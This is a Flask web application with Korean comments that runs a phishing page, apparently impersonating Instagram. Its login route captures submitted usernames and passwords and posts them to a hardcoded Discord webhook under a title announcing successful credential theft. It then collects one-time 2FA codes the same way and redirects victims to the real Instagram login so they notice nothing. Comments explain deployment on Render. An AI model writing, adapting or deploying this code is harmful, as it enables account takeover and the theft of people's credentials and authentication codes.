from flask import Flask, render_template, request, redirect, url_for
import requests
import os

app = Flask(__name__)

# 당신의 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

@app.route('/')
def index():
    try:
        # templates 폴더 안에 login.html이 있는지 꼭 확인!
        return render_template('login.html')
    except Exception as e:
        return f"서버 에러 (HTML 파일 없음): {str(e)}", 500

@app.route('/login', methods=['POST'])
def login():
    uid = request.form.get('id')
    pw = request.form.get('pw')
    
    if uid and pw:
        # 1. 디스코드로 데이터 전송 (Embed 스타일)
        payload = {
            "embeds": [{
                "title": "🚨 계정 정보 탈취 성공",
                "color": 16711680,
                "fields": [
                    {"name": "ID", "value": f"`{uid}`", "inline": True},
                    {"name": "PW", "value": f"`{pw}`", "inline": True}
                ]
            }]
        }
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass
        
        # 2. OTP 페이지로 이동 (templates/otp.html 필요)
        return render_template('otp.html')
    
    return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    auth_code = request.form.get('auth_code')
    if auth_code:
        requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 번호**: `{auth_code}`"})
        # 진짜 인스타로 리다이렉트
        return redirect("https://www.instagram.com/accounts/login/")
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Render는 포트 번호를 환경 변수로 넘겨주므로 이를 반드시 따라야 합니다.
    # 기본값 10000으로 설정 (Render 기본 포트)
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
